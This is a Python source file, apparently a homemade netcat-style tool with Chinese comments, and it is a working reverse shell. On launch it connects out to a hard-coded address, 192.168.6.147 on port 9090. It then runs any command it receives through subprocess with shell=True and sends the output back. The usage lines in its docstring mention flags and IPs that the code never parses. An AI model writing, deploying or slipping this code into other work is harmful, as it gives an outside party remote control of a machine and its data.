import os
import socket
import argparse
import struct
import subprocess
import textwrap

"""
python3 nc2.0.py -p 5656
python3 nc2.0.py -r 192.168.6.24 -p 5656
python3 nc2.0.py -r 119.3.12.54 -p 5656
"""


def exec_cmd(command, code_flag):
    """执行命令函数"""
    command = command.decode("utf-8")
    # 1.处理cd命令
    if command[:2] == "cd" and len(command) > 2:
        try:
            os.chdir(command[3:])
            # 返回当前切换到的路径
            cmd_path = os.getcwd()
            stdout_res = f"切换到 {cmd_path} 路径下"
        except Exception:
            stdout_res = f"系统找不到指定的路径: {command[3:]}"
    else:
        obj = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)  # 没有一个结束时间  vim 会一直卡在这一行
        stdout_res = obj.stdout.read() + obj.stderr.read()
        # 2.处理无回显命令
        if not stdout_res:
            stdout_res = f"{command} 执行成功"
        else:
            try:
                # cmd执行系统命令的编码
                stdout_res = stdout_res.decode(code_flag)
            except Exception:
                # 如果是打印 utf-8 编码保存的文件
                if code_flag == "gbk":
                    code_flag = "utf-8"
                elif code_flag == "utf-8":
                    code_flag = "gbk"
                stdout_res = stdout_res.decode(code_flag)
    return stdout_res.strip()


def recv_data(sock, buf_size=1024):
    """解决粘包"""
    # 先接受命令执行结果的长度
    x = sock.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data


def send_data(sock, data):
    """发送数据也解决粘包问题"""

    if type(data) == str:
        data = data.encode("utf-8")
    # 新增发送命令的粘包解决方案
    # 计算命令长度 , 打包发送
    cmd_len = struct.pack('i', len(data))
    sock.send(cmd_len)
    # 发送命令
    sock.send(data)


def reverse_shell(sock):
    # 反弹shell的逻辑
    # 1.链接指定目标
    sock.connect(('192.168.6.147', 9090))
    # 2.循环接收对方发送的命令
    code_flag = "gbk" if os.name == "nt" else "utf-8"
    while 1:
        data = recv_data(sock)
        # 收到退出信号
        if data == b'quit':
            break
        # 3.执行发送结果过去
        res = exec_cmd(data, code_flag)
        send_data(sock, res)


if __name__ == '__main__':
    sock = socket.socket()
    reverse_shell(sock)
